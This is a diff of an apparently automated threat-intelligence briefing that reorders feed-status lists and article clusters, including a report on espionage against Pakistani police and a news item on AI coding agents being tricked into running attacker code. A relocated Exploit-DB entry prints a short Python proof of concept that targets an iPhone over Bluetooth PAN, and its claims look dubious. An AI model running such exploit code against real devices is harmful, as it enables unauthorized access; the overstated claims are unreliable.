@@ -1,6 +1,6 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-11T19:16:02.556281+00:00
+- Generated: 2026-07-11T20:58:34.640803+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
@@ -70,35 +70,30 @@
 
 ## Feed status
 
-- **Unit 42** (threat_research_primary)
-  - URL: https://unit42.paloaltonetworks.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
+- **Unit 42** (threat_research_primary)
+  - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
-  - Item count: 10
-  - In window count: 1
+  - Item count: 15
+  - In window count: 2
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 4
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
   - Item count: 25
-  - In window count: 0
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
@@ -110,6 +105,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
@@ -120,31 +120,31 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
-  - Item count: 10
+  - Item count: 100
   - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 2
+  - In window count: 1
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 1
+  - Item count: 10
+  - In window count: 2
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
@@ -155,21 +155,26 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: ok
-  - Item count: 78
-  - In window count: 0
+  - Item count: 50
+  - In window count: 19
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: ok
+  - Item count: 78
+  - In window count: 0
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
@@ -180,31 +185,26 @@
   - Status: ok
   - Item count: 40
   - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 19
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 0
-- **TrustedSec** (detection_response_operations)
-  - URL: https://www.trustedsec.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
+  - In window count: 0
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
   - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **TrustedSec** (detection_response_operations)
+  - URL: https://www.trustedsec.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
@@ -215,6 +215,11 @@
   - Status: ok
   - Item count: 15
   - In window count: 1
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
@@ -225,51 +230,46 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - URL: https://orca.security/resources/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
   - In window count: 3
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 9
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **AWS Security Blog** (cloud_identity_infrastructure)
   - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
   - Item count: 20
   - In window count: 6
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - URL: https://orca.security/resources/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 9
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
@@ -285,46 +285,41 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+- **Google DeepMind Blog** (ai_security_agentic_risk)
+  - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
-  - Item count: 20
+  - Item count: 100
   - In window count: 0
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Google DeepMind Blog** (ai_security_agentic_risk)
-  - URL: https://deepmind.google/blog/rss.xml
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
-  - Item count: 100
+  - Item count: 20
   - In window count: 0
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 19
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 0
+  - In window count: 1
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
   - Status: ok
-  - Item count: 5
-  - In window count: 5
+  - Item count: 10
+  - In window count: 0
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
@@ -335,11 +330,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **AI Snake Oil** (ai_security_agentic_risk)
-  - URL: https://www.aisnakeoil.com/feed
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
   - Status: ok
-  - Item count: 20
-  - In window count: 1
+  - Item count: 5
+  - In window count: 5
 - **Simon Willison** (ai_security_agentic_risk)
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
@@ -350,16 +345,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **AI Snake Oil** (ai_security_agentic_risk)
+  - URL: https://www.aisnakeoil.com/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Dark Reading** (cyber_news_breach_reporting)
-  - URL: https://www.darkreading.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 22
 - **Black Hills Information Security** (detection_response_operations)
   - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
@@ -370,11 +365,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
+- **Dark Reading** (cyber_news_breach_reporting)
+  - URL: https://www.darkreading.com/rss.xml
   - Status: ok
-  - Item count: 100
-  - In window count: 0
+  - Item count: 50
+  - In window count: 22
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
@@ -385,8 +380,28 @@
   - Status: ok
   - Item count: 10
   - In window count: 6
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
+- **Reddit r/blueteamsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -395,20 +410,10 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/blueteamsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
-  - In window count: 0
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
   - In window count: 0
 - **Reddit r/netsecstudents** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsecstudents/.rss
@@ -430,11 +435,6 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
@@ -1507,49 +1507,6 @@ AWS Security Blog Enforce zero data retention on Amazon Bedrock with Bedrock Pro
   - Link: https://thehackernews.com/2026/07/friendly-fire-ai-agents-built-to-catch.html
   - Summary: Ask an AI coding agent to scan open-source code for security holes, and it might run the attacker's code on your own machine instead. That is the finding in a proof-of-concept published Wednesday by the AI Now Institute, an attack it calls "Friendly Fire." It works against Anthropic's Claude Code and OpenAI's Codex when either is running in an autonomous mode that approves its own
 
-### Cluster 4a0789d0ad — score 10
-
-- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-- Source: SentinelOne Labs (threat_research_primary)
-- Published: 2026-07-09T12:55:00+00:00
-- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
-```
-
-#### Full body
-
-```
-Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
-```
-
-#### Corroborating sources (1)
-
-- **SentinelOne Labs** (threat_research_primary)
-  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-  - Published: 2026-07-09T12:55:00+00:00
-  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
-
 ### Cluster b835d1d4b1 — score 10
 
 - Title: GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware
@@ -1597,6 +1554,49 @@ Share Link copied to clipboard! Tags Malware Threats intelligence Cyberattacker 
   - Published: 2026-07-09T15:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/09/gigawiper-anatomy-of-a-destructive-backdoor-assembled-from-multiple-malware/
   - Summary: GigaWiper is a destructive backdoor that combines multiple wiping and ransomware-like capabilities into a single operational platform. This blog analyzes how the malware incorporates code from several previously separate malware families and provides guidance to help defenders detect and defend against similar threats. The post GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware appeared first on Microsoft Security Blog .
+
+### Cluster 4a0789d0ad — score 10
+
+- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+- Source: SentinelOne Labs (threat_research_primary)
+- Published: 2026-07-09T12:55:00+00:00
+- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
+```
+
+#### Full body
+
+```
+Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
+```
+
+#### Corroborating sources (1)
+
+- **SentinelOne Labs** (threat_research_primary)
+  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+  - Published: 2026-07-09T12:55:00+00:00
+  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
 
 ### Cluster ca7dbcaa1e — score 10
 
@@ -1909,6 +1909,45 @@ How NodeZero® Rapid Response Helps Operationalize BOD 26-04 Tim Jones July 6, 2
   - Link: https://horizon3.ai/intelligence/blogs/nodezero-rapid-response-bod-26-04/
   - Summary: CISA BOD 26-04 shifts federal vulnerability management toward risk-based prioritization. Learn how NodeZero® Rapid Response helps agencies validate exploitability, prioritize remediation, and verify fixes.
 
+### Cluster 0514a6908e — score 10
+
+- Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+- Source: Exploit-DB (offensive_vulnerability_research)
+- Published: 2026-07-07T00:00:00+00:00
+- Link: https://www.exploit-db.com/exploits/52618
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real "Ethernet" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = "XX:XX:XX:XX:XX:XX" USB_PORT = 62078 def create_pan_connection(mac_address): """ Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. """ try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f"[+] PAN connection established to {mac_address}") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect(("172.20.10.1", USB_PORT)) print(f"[+] USB port {USB_PORT} is now open and reachable!") print("[+] Ethernet icon should now be visible on the target iPhone.") usb_sock.close() sock.close() except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": print("[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway") print("[*] Target MAC: " + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
+```
+
+#### Corroborating sources (1)
+
+- **Exploit-DB** (offensive_vulnerability_research)
+  - Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+  - Published: 2026-07-07T00:00:00+00:00
+  - Link: https://www.exploit-db.com/exploits/52618
+  - Summary: iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+
 ### Cluster 8d0224c08d — score 10
 
 - Title: June 2026 CVE Landscape
@@ -1998,45 +2037,6 @@ The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vib
   - Published: 2026-07-08T00:00:00+00:00
   - Link: https://www.recordedfuture.com/blog/build-defensive-ai-agents
   - Summary: The real AI threat isn't frontier models. It's cheap local models getting easier to run. Here's why CISOs should build defensive agents now, before attackers scale.
-
-### Cluster 0514a6908e — score 10
-
-- Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-07-07T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52618
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real "Ethernet" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = "XX:XX:XX:XX:XX:XX" USB_PORT = 62078 def create_pan_connection(mac_address): """ Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. """ try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f"[+] PAN connection established to {mac_address}") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect(("172.20.10.1", USB_PORT)) print(f"[+] USB port {USB_PORT} is now open and reachable!") print("[+] Ethernet icon should now be visible on the target iPhone.") usb_sock.close() sock.close() except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": print("[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway") print("[*] Target MAC: " + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits 